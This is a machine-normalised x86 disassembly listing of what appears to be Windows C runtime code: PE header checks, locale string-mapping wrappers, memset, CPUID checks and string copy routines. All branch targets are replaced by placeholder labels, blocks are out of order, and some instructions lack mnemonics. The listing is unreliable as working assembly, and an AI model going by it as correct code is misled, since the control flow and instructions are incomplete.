push [ ebp + 0x8 ]
call sub_10017129
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001724a
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
sub_10017267
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_1000fa90
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10017290
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100172d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10017320
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10011eb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10017290
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100172d0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10017445
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10017489
push 0x20
push r--data
call sub_10011e54
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000fcde
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10011e99
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10017445
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1000e925
mov [ ebp - 0x1c ] 0x1
push eax
call sub_1000fb0b
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100102e7
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1001135a
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1000fb02
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100175fd
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10017666
push 0x10
push r--data
call sub_10011e54
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
sub_100176c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1000c3e9
pop ecx
sub_100176e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_1001aa2a
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c176
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1001aa73
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1000c3e9
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_1000c3e9
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_100176c6
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1000cef2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001ac30
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_1000ebe0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1001aa73
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1000cef2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001ac30
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_100176c6
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_100176c6
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1000cef2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001ac30
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10017a8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_100176e6
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10017ad0
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10017b27
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_10017b27
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_10017ad0
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10017c06
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_10017bb6
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_10017c80
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10017d0e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_1001aa2a
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c176
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1001aa73
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_1000c3e9
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000ebe0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_100176c6
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000cef2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001ac30
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10017ec8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10017d0e
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10017f0a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1000c3e9
push [ esi + 0x8 ]
call sub_1000c3e9
push [ esi + 0xc ]
call sub_1000c3e9
push [ esi + 0x10 ]
call sub_1000c3e9
push [ esi + 0x14 ]
call sub_1000c3e9
push [ esi + 0x18 ]
call sub_1000c3e9
push [ esi ]
call sub_1000c3e9
push [ esi + 0x20 ]
call sub_1000c3e9
push [ esi + 0x24 ]
call sub_1000c3e9
push [ esi + 0x28 ]
call sub_1000c3e9
push [ esi + 0x2c ]
call sub_1000c3e9
push [ esi + 0x30 ]
call sub_1000c3e9
push [ esi + 0x34 ]
call sub_1000c3e9
push [ esi + 0x1c ]
call sub_1000c3e9
push [ esi + 0x38 ]
call sub_1000c3e9
push [ esi + 0x3c ]
call sub_1000c3e9
add esp 0x40
push [ esi + 0x40 ]
call sub_1000c3e9
push [ esi + 0x44 ]
call sub_1000c3e9
push [ esi + 0x48 ]
call sub_1000c3e9
push [ esi + 0x4c ]
call sub_1000c3e9
push [ esi + 0x50 ]
call sub_1000c3e9
push [ esi + 0x54 ]
call sub_1000c3e9
push [ esi + 0x58 ]
call sub_1000c3e9
push [ esi + 0x5c ]
call sub_1000c3e9
push [ esi + 0x60 ]
call sub_1000c3e9
push [ esi + 0x64 ]
call sub_1000c3e9
push [ esi + 0x68 ]
call sub_1000c3e9
push [ esi + 0x6c ]
call sub_1000c3e9
push [ esi + 0x70 ]
call sub_1000c3e9
push [ esi + 0x74 ]
call sub_1000c3e9
push [ esi + 0x78 ]
call sub_1000c3e9
push [ esi + 0x7c ]
call sub_1000c3e9
add esp 0x40
push [ esi + 0x80 ]
call sub_1000c3e9
push [ esi + 0x84 ]
call sub_1000c3e9
push [ esi + 0x88 ]
call sub_1000c3e9
push [ esi + 0x8c ]
call sub_1000c3e9
push [ esi + 0x90 ]
call sub_1000c3e9
push [ esi + 0x94 ]
call sub_1000c3e9
push [ esi + 0x98 ]
call sub_1000c3e9
push [ esi + 0x9c ]
call sub_1000c3e9
push [ esi + 0xa0 ]
call sub_1000c3e9
push [ esi + 0xa4 ]
call sub_1000c3e9
push [ esi + 0xa8 ]
call sub_1000c3e9
add esp 0x2c
sub_1001809f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
push esi
call sub_1000c3e9
pop ecx
sub_100180e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000c3e9
pop ecx
push esi
call sub_1000c3e9
pop ecx
sub_10018198
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1001034f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
sub_10018210
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10018256
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
